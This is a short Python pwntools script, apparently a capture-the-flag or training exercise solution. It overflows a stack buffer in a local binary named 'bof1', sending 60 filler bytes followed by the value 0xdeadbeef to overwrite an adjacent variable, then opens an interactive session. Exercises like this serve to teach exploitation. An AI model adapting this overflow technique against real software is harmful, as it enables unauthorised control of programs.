#!/usr/bin/python3

from pwn import * 

context.binary = exe = ELF('./bof1') 

p = process(exe.path)

p.sendline(b'x' * (0x40 - 0x4) + p64(0xdeadbeef))

p.interactive()